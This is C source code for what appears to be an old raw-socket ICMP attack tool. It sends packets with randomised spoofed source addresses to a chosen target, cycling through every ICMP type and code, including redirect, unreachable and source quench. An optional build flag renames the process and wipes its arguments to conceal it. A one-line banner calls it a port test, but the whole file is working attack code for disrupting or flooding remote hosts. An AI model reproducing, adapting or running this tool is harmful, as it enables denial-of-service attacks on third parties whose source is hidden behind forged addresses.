#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/icmp.h>


#define SEQ 0x28376839
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

unsigned long send_seq, ack_seq, srcport, dport;
char flood = 0;
int sock, ssock, curc, cnt, checker1=0, checker2=0;

/* Check Sum */
unsigned short
ip_sum (addr, len)
u_short *addr;
int len;
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;
	
	while (nleft > 1)
	  {
		  sum += *w++;
		  nleft -= 2;
	  }
	if (nleft == 1)
	  {
		  *(u_char *) (&answer) = *(u_char *) w;
		  sum += answer;
	  }
	sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
	sum += (sum >> 16);           /* add carry */
	answer = ~sum;                /* truncate to 16 bits */
	return (answer);
}
void sig_exit(int crap)
{
#ifndef HEALTHY
	printf("[H[JSignal Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}
void sig_segv(int crap)
{
#ifndef NOSEGV
	printf("[H[JSegmentation Violation Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}

unsigned long getaddr(char *name) {
	struct hostent *hep;
	
	hep=gethostbyname(name);
	if(!hep) {
		fprintf(stderr, "Unknown host %s\n", name);
		exit(1);
	}
	return *(unsigned long *)hep->h_addr;
}


void send_icmp_segment(struct iphdr *ih, struct icmphdr *th, char *data, int dlen) {
	char buf[65536];
	struct {  /* rfc 793 tcp pseudo-header */
		unsigned long saddr, daddr;
		char mbz;
		char ptcl;
		unsigned short icmpl;
	} ph;
	
	struct sockaddr_in sin;	/* how necessary is this, given that the destination
				 address is already in the ip header? */
	
	ph.saddr=ih->saddr;
	ph.daddr=ih->daddr;
	ph.mbz=0;
	ph.ptcl=IPPROTO_ICMP;
	ph.icmpl=htons(sizeof(*th)+dlen);
	
	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf+sizeof(ph), th, sizeof(*th));
	memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
	memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
	th->checksum = ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);
	
	memcpy(buf, ih, 4*ih->ihl);
	memcpy(buf+4*ih->ihl, th, sizeof(*th));
	memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);
	memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);
	
	ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);
	memcpy(buf, ih, 4*ih->ihl);
	
	sin.sin_family=AF_INET;
	sin.sin_port= dport;
	sin.sin_addr.s_addr=ih->daddr;
	
	if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0, &sin, sizeof(sin))<0) {
		printf("Error sending syn packet.\n"); perror("");
		exit(1);
	}
}

unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port) {
	int i, s;
	struct iphdr ih;
	struct icmphdr th;
	struct sockaddr_in sin;
	int sinsize;
	unsigned short myport=6969;
	char buf[1024];
	struct timeval tv;
        dport = port;
	
	ih.version=4;
	ih.ihl=5;
	ih.tos=0;			/* XXX is this normal? */
	ih.tot_len=sizeof(ih)+sizeof(th);
	ih.id=htons(random());
	ih.frag_off=0;
	ih.ttl=30;
	ih.protocol=IPPROTO_ICMP;
	ih.check=0;
	ih.saddr=my_ip;
	ih.daddr=their_ip;
	//------------------ ICMP_ECHOREPLY ------------------------//	
	if(checker1 == 0){
		th.type = 0;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_DEST_UNREACK ----------------------//
	else if(checker1 == 1){
		th.type = 3;
		th.code = checker2;
		if(checker2 == 15){
			checker2=0;
			checker1++;
		}
		else
			checker2++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_SOURCE_QUENCH ---------------------//
	else if(checker1 == 2){
		th.type = 4;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_REDIRECT --------------------------//
	else if(checker1 == 3){
		th.type = 5;
		th.code = checker2;
		if(checker2 == 3){
			checker2 = 0;
			checker1++;
		}
		else
			checker2++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_ECHO ------------------------------//
	else if(checker1 == 4){
		th.type = 8;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ Router Advertisement--------------------//
	else if(checker1 == 5){
		th.type = 9;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ Router Solicitation --------------------//
	else if(checker1 == 6){
		th.type = 10;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//------------------ ICMP_TIME_EXCEEDED ---------------------//
	else if(checker1 == 7){
		th.type = 11;
		th.code = checker2;
		if(checker2 == 1){
			checker2 = 0;
			checker1++;
		}
		else
			checker2++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_PARAMETERPROB ---------------------//
	else if(checker1 == 8){
		th.type = 12;
		th.code = checker2;
		if(checker2 == 1){
			checker2 = 0;
			checker1++;
		}
		else
			checker2++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_TIMESTAMP -------------------------//
	else if(checker1 == 9){
		th.type = 13;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_TIMESTAMPREPLY --------------------//
	else if(checker1 == 10){
		th.type = 14;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_INFO_REQUEST ----------------------//
	else if(checker1 == 11){
		th.type = 15;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_INFO_REPLY ------------------------//
	else if(checker1 == 12){
		th.type = 16;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_ADDRESS ---------------------------//
	else if(checker1 == 13){
		th.type = 17;
		th.code = 0;
		checker2 = 0;
		checker1++;
	}
	//-----------------------------------------------------------//
	//------------------ ICMP_ADDRESSREPLY ----------------------//
	else if(checker1 == 14){
		th.type = 18;
		th.code = 0;
		checker2 = 0;
		checker1 = 0;
	}
	//-----------------------------------------------------------//
	th.checksum = 0;
	
	gettimeofday(&tv, 0);
	
	send_icmp_segment(&ih, &th, "", 0); 
	
	send_seq = SEQ+1+strlen(buf);
}
void upsc()
{
	int i;
	char schar;
	switch(cnt)
	  {
	  case 0:
		    {
			    schar = '|';
			    break;
		    }
	  case 1:
		    {
			    schar = '/';
			    break;
		    }
	  case 2:
		    {
			    schar = '-';
			    break;
		    }
	  case 3:
		    {
			    schar = '\\';
			    break;
		    }
	  case 4:
		    {
			    schar = '|';
			    cnt = 0;
			    break;
		    }
	  }
	printf("[H[1;30m[[1;31m%c[1;30m][0m", schar);
	cnt++;
	for(i=0; i<26; i++)  {
		i++;
		curc++;
	}
}
void init_signals()
{
	// Every Signal known to man. If one gives you an error, comment it out!
	signal(SIGHUP, sig_exit);
	signal(SIGINT, sig_exit);
	signal(SIGQUIT, sig_exit);
	signal(SIGILL, sig_exit);
	signal(SIGTRAP, sig_exit);
	signal(SIGIOT, sig_exit);
	signal(SIGBUS, sig_exit);
	signal(SIGFPE, sig_exit);
	signal(SIGKILL, sig_exit);
	signal(SIGUSR1, sig_exit);
	signal(SIGSEGV, sig_segv);
	signal(SIGUSR2, sig_exit);
	signal(SIGPIPE, sig_exit);
	signal(SIGALRM, sig_exit);
	signal(SIGTERM, sig_exit);
	signal(SIGCHLD, sig_exit);
	signal(SIGCONT, sig_exit);
	signal(SIGSTOP, sig_exit);
	signal(SIGTSTP, sig_exit);
	signal(SIGTTIN, sig_exit);
	signal(SIGTTOU, sig_exit);
	signal(SIGURG, sig_exit);
	signal(SIGXCPU, sig_exit);
	signal(SIGXFSZ, sig_exit);
	signal(SIGVTALRM, sig_exit);
	signal(SIGPROF, sig_exit);
	signal(SIGWINCH, sig_exit);
	signal(SIGIO, sig_exit);
	signal(SIGPWR, sig_exit);
}
main(int argc, char **argv) {
   int i, x, max, floodloop, diff, urip, a, b, c, d, j;
   unsigned long them, me_fake;
   unsigned lowport, highport;
   char buf[1024], *junk;
   j=0;
   init_signals();   
#ifdef HIDDEN
   for (i = argc-1; i >= 0; i--)
     /* Some people like bzero...i prefer memset :) */
     memset(argv[i], 0, strlen(argv[i]));
   strcpy(argv[0], HIDDEN);
#endif
   
   if(argc<5) {
      printf("Usage: %s srcaddr dstaddr low high\n", argv[0]);
      printf("    If srcaddr is 0, random addresses will be used\n\n\n");
      
      exit(1);
   }
   if( atoi(argv[1]) == 0 )
     urip = 1;
   else    
     me_fake=getaddr(argv[1]);
   them=getaddr(argv[2]);
   lowport=atoi(argv[3]);
   highport=atoi(argv[4]);
   srandom(time(0));
   ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(ssock<0) {
      perror("socket (raw)");
      exit(1);
   }
   sock=socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
   if(sock<0) {
      perror("socket");
      exit(1);
   }
   junk = (char *)malloc(1024);
   max = 1500;
   i = 1;
   diff = (highport - lowport);
   
   if (diff > -1) 
     {
		printf("[H[J\n\nSend packet to test open services port in Protocol ICMP.\n");
	     srandom((time(0)+i));
	     srcport = getrandom(1, max)+1000;
	     for (x=lowport;x<=highport;x++) 
	     {
	     	 a = getrandom(0, 255);
		 b = getrandom(0, 255);
		 c = getrandom(0, 255);
		 d = getrandom(0, 255);
		 sprintf(junk, "%i.%i.%i.%i", a, b, c, d);
		 me_fake = getaddr(junk);
		  
		  spoof_open(/*0xe1e26d0a*/ me_fake, them, x);
		  /* A fair delay. Good for a 28.8 connection */ 
		  if(j == 5)
		  {
			  j = 0;
			  upsc();
			  fflush(stdout);
			  usleep(50);
		  }
		  else
			  j++;
	       }
     }
   else {
      printf("High port must be greater than Low port.\n");
      exit(1);
   }
}
